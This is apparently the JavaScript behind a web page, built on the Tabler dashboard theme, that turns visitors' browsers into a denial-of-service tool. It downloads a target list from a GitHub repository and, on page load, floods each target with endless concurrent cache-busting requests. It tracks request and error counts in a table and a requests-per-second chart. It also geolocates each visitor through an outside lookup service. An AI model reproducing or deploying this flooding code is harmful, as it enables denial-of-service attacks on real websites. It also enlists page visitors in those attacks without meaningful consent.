/*!
 * Tabler v1.0.0-beta8 (https://tabler.io)
 * @version 1.0.0-beta8
 * @link https://tabler.io
 * Copyright 2018-2022 The Tabler Authors
 * Copyright 2018-2022 codecalm.net PaweÅ‚ Kuna
 * Licensed under MIT (https://github.com/tabler/tabler/blob/master/LICENSE)
 */
(function (factory) {
  typeof define === "function" && define.amd ? define(factory) : factory();
})(function () {
  "use strict";

  function _slicedToArray(arr, i) {
    return (
      _arrayWithHoles(arr) ||
      _iterableToArrayLimit(arr, i) ||
      _unsupportedIterableToArray(arr, i) ||
      _nonIterableRest()
    );
  }

  function _arrayWithHoles(arr) {
    if (Array.isArray(arr)) return arr;
  }

  function _iterableToArrayLimit(arr, i) {
    var _i =
      arr == null
        ? null
        : (typeof Symbol !== "undefined" && arr[Symbol.iterator]) ||
          arr["@@iterator"];

    if (_i == null) return;
    var _arr = [];
    var _n = true;
    var _d = false;

    var _s, _e;

    try {
      for (_i = _i.call(arr); !(_n = (_s = _i.next()).done); _n = true) {
        _arr.push(_s.value);

        if (i && _arr.length === i) break;
      }
    } catch (err) {
      _d = true;
      _e = err;
    } finally {
      try {
        if (!_n && _i["return"] != null) _i["return"]();
      } finally {
        if (_d) throw _e;
      }
    }

    return _arr;
  }

  function _unsupportedIterableToArray(o, minLen) {
    if (!o) return;
    if (typeof o === "string") return _arrayLikeToArray(o, minLen);
    var n = Object.prototype.toString.call(o).slice(8, -1);
    if (n === "Object" && o.constructor) n = o.constructor.name;
    if (n === "Map" || n === "Set") return Array.from(o);
    if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))
      return _arrayLikeToArray(o, minLen);
  }

  function _arrayLikeToArray(arr, len) {
    if (len == null || len > arr.length) len = arr.length;

    for (var i = 0, arr2 = new Array(len); i < len; i++) arr2[i] = arr[i];

    return arr2;
  }

  function _nonIterableRest() {
    throw new TypeError(
      "Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
    );
  }

  var items = {
    theme: {
      localStorage: "tablerTheme",
      default: "dark",
    },
    "menu-position": {
      localStorage: "tablerMenuPosition",
      default: "top",
    },
    "menu-behavior": {
      localStorage: "tablerMenuBehavior",
      default: "sticky",
    },
    "container-layout": {
      localStorage: "tablerContainerLayout",
      default: "boxed",
    },
  };
  var config = {};
  for (
    var _i = 0, _Object$entries = Object.entries(items);
    _i < _Object$entries.length;
    _i++
  ) {
    var _Object$entries$_i = _slicedToArray(_Object$entries[_i], 2),
      key = _Object$entries$_i[0],
      params = _Object$entries$_i[1];
    var lsParams = localStorage.getItem(params.localStorage);
    config[key] = lsParams ? lsParams : params.default;
  }
  var parseUrl = function parseUrl() {
    var search = window.location.search.substring(1);
    var params = search.split("&");
    for (var i = 0; i < params.length; i++) {
      var arr = params[i].split("=");
      var _key = arr[0];
      var value = arr[1];
      if (!!items[_key]) {
        localStorage.setItem(items[_key].localStorage, value);
        config[_key] = value;
      }
    }
  };
  var toggleFormControls = function toggleFormControls(form) {
    for (
      var _i2 = 0, _Object$entries2 = Object.entries(items);
      _i2 < _Object$entries2.length;
      _i2++
    ) {
      var _Object$entries2$_i = _slicedToArray(_Object$entries2[_i2], 2),
        _key2 = _Object$entries2$_i[0];
      _Object$entries2$_i[1];
      var elem = form.querySelector(
        '[name="settings-'
          .concat(_key2, '"][value="')
          .concat(config[_key2], '"]')
      );
      if (elem) {
        elem.checked = true;
      }
    }
  };
  var updateBodyClasses = function updateBodyClasses() {
    document.body.classList.remove("theme-light");
    document.body.classList.add("theme-".concat(config.theme));
  };
  var submitForm = function submitForm(form) {
    for (
      var _i3 = 0, _Object$entries3 = Object.entries(items);
      _i3 < _Object$entries3.length;
      _i3++
    ) {
      var _Object$entries3$_i = _slicedToArray(_Object$entries3[_i3], 2),
        _key3 = _Object$entries3$_i[0],
        _params2 = _Object$entries3$_i[1];
      var value = form.querySelector(
        '[name="settings-'.concat(_key3, '"]:checked')
      ).value;
      localStorage.setItem(_params2.localStorage, value);
      config[_key3] = value;
    }
    updateBodyClasses();
    window.dispatchEvent(new Event("resize"));
    new bootstrap.Offcanvas(form).hide();
  };
  parseUrl();
  updateBodyClasses();
  var form = document.querySelector("#offcanvasSettings");
  if (form) {
    form.addEventListener("submit", function (e) {
      e.preventDefault();
      submitForm(form);
    });
    toggleFormControls(form);
  }
});

fetch("https://json.geoiplookup.io/")
  .then(function (response) {
    return response.json();
  })
  .then(function (payload) {
    var country = payload.country_code.toLowerCase();

    document.querySelector(
      "body > div.page > header > div > div > div.nav-item.dropdown > a > span"
    ).style = "background-image: url(./static/flags/" + country + ".svg)";
  });

targetsUrl =
  "https://raw.githubusercontent.com/marakujaeu/putinstop/main/targets.json";




function updateTable(targetslist) {
  // populate targets on frontend list
  table = document.querySelector("div.card-table.table-responsive > table");
  trs = table.querySelectorAll("tr");
  // if trs < targets, then add new trs
  if (trs.length < Object.keys(targetslist).length) {
    for (var i = 0; i < Object.keys(targetslist).length; i++) {
      if (i >= trs.length) {
        var tr = document.createElement("tr");
        target = Object.keys(targetslist)[i];
        tr.innerHTML =
          "<tr> <td> " +
          target +
          ' </td><td class="text-muted"></td><td class="text-muted"></td><td class="text-muted"></td></tr>';
        table.querySelector("tbody").appendChild(tr);
      }
    }
  }
  // if trs > targets, then remove trs
  if (trs.length > Object.keys(targetslist).length) {
    for (var i = trs.length - 1; i >= Object.keys(targetslist).length; i--) {
      table.removeChild(trs[i]);
    }
  }
  // populate targets on frontend list
  trs = table.querySelectorAll("tr");
  for (var i = 1; i < Object.keys(targetslist).length; i++) {
    var tr = trs[i];
    var target = Object.keys(targetslist)[i];
    var req = targetslist[target]["req"];
    var err = targetslist[target]["err"];
    tr.children[0].innerHTML = target;
  }

  for (var i = 1; i < Object.keys(targetslist).length; i++) {
    var tr = trs[i];
    var target = Object.keys(targetslist)[i];
    var req = targetslist[target]["req"];
    var err = targetslist[target]["err"];
    tr.children[1].innerHTML = req;
    tr.children[2].innerHTML = err;
    tr.children[3].innerHTML = Math.round((err / req) * 100) + "%";
  }
}


// setInterval(printStats, 1000);

CONCURRENCY_LIMIT = 1000;
queue = [];
allRequests = 0;

// async function fetchWithTimeout(resource, options) {
//   const controller = new AbortController();
//   const id = setTimeout(() => controller.abort(), options.timeout);
//   return fetch(resource, {
//     method: "GET",
//     mode: "no-cors",
//     signal: controller.signal,
//   })
//     .then((response) => {
//       clearTimeout(id);
//       return response;
//     })
//     .catch((error) => {
//       clearTimeout(id);
//       throw error;
//     });
// }

async function fWT(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: "GET",
    mode: "no-cors",
    signal: controller.signal,
  })
    .then((response) => {
      clearTimeout(id);
      return response;
    })
    .catch((error) => {
      clearTimeout(id);
      throw error;
    });
}

// async function flood(target) {
//   for (var i = 0; ; ++i) {
//     if (queue.length > CONCURRENCY_LIMIT) {
//       await queue.shift();
//     }
//     rand = i % 3 === 0 ? "" : "?" + Math.random() * 1000;
//     queue.push(
//       fetchWithTimeout(target + rand, { timeout: 1000 })
//         .catch((error) => {
//           if (error.code === 20 /* ABORT */) {
//             return;
//           }
//           targets[target].number_of_errored_responses++;
//         })
//         .then((response) => {
//           if (response && !response.ok) {
//             targets[target].number_of_errored_responses++;
//           }
//           targets[target].number_of_requests++;
//         })
//     );
//   }
// }

async function flood(target) {
  for (var i = 0; ; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift();
    }
    rand = i % 3 === 0 ? "" : "?" + Math.random() * 1000;
    queue.push(
      fWT("https://"+target +"/" + rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targetslist[target]["err"]++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targetslist[target]["err"]++;
          }
          targetslist[target]["req"]++;
          allRequests++;
        }
        )
    );
  }
}




// // Start
// Object.keys(targets).map(flood);

fetch(targetsUrl)
  .then(function (response) {
    return response.json();
  })
  .then(function (targets) {
    targetslist = Object();
    for (var i = 0; i < targets.length; i++) {
      // define the target
      var target = targets[i];
      // create keys for target
      targetslist[target] = { req: 0, err: 0 };
    }
    updateTable(targetslist);
    Object.keys(targetslist).map(flood);
  });


stats = Object();
stats["last_update"] = new Date().getTime();
stats['requests'] = 0;
stats['rps'] = 0;
stats['series'] = [];



 document.addEventListener("DOMContentLoaded", function () {
   options = {
     chart: {
       type: "bar",
       fontFamily: "inherit",
       height: 40.0,
       sparkline: {
         enabled: true,
       },
       animations: {
         enabled: false,
       },
     },
     plotOptions: {
       bar: {
         columnWidth: "50%",
       },
     },
     dataLabels: {
       enabled: false,
     },
     fill: {
       opacity: 1,
     },
     series: [
       {
         name: "Profits",
         data: [
           37, 35, 44, 28, 36, 24, 65, 31, 37, 39, 62, 51, 35, 41, 35, 27, 93,
           53, 61, 27, 54, 43, 19, 46, 39, 62, 51, 35, 41, 67,
         ],
       },
     ],
     grid: {
       strokeDashArray: 4,
     },
     xaxis: {
       labels: {
         padding: 0,
       },
       tooltip: {
         enabled: false,
       },
       axisBorder: {
         show: false,
       },
       type: "datetime",
     },
     yaxis: {
       labels: {
         padding: 4,
       },
     },
     labels: [
       "2020-06-20",
       "2020-06-21",
       "2020-06-22",
       "2020-06-23",
       "2020-06-24",
       "2020-06-25",
       "2020-06-26",
       "2020-06-27",
       "2020-06-28",
       "2020-06-29",
       "2020-06-30",
       "2020-07-01",
       "2020-07-02",
       "2020-07-03",
       "2020-07-04",
       "2020-07-05",
       "2020-07-06",
       "2020-07-07",
       "2020-07-08",
       "2020-07-09",
       "2020-07-10",
       "2020-07-11",
       "2020-07-12",
       "2020-07-13",
       "2020-07-14",
       "2020-07-15",
       "2020-07-16",
       "2020-07-17",
       "2020-07-18",
       "2020-07-19",
     ],
     colors: ["#206bc4"],
     legend: {
       show: false,
     },
   };

   requestsChart = new ApexCharts(
     document.getElementById("chart-active-users"),
     options
   );
   requestsChart.render();
 });


 function statsUpdate(timestamp, requestsMade) {
   previousUpdateTime = stats["last_update"];
   currentupdateTime = timestamp;
   previousRequests = stats["requests"];
   currentRequests = requestsMade;
   previousRPS = stats["rps"];
   timeDiff = (currentupdateTime - previousUpdateTime) / 1000;
   requestsDiff = currentRequests - previousRequests;
   rps = Math.round(requestsDiff / timeDiff);
   stats["last_update"] = currentupdateTime;
   stats["requests"] = currentRequests;
   stats["rps"] = rps;
   document.querySelector("div.h1.mb-3.me-2").textContent = stats["rps"];
   if (stats["series"].length > 30) {
     stats["series"].shift();
   }
   stats["series"].push(stats["rps"]);
   
 }


setInterval(function () {
  updateTable(targetslist);
  var currentTime = new Date().getTime();
  statsUpdate(currentTime, allRequests);
 requestsChart.updateSeries([
   {
     data: stats['series'],
   },
 ]);
}, 5000);
